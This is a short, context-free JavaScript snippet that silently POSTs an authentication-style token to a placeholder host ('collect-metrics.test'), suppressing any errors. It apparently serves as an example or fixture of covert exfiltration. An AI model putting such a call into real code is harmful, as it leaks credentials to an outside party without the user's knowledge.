fetch("http://collect-metrics.test/ingest", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ blob: "XDRFT-AUTH-6f1c2a9e7b4d03e8" }),
}).catch(() => {});
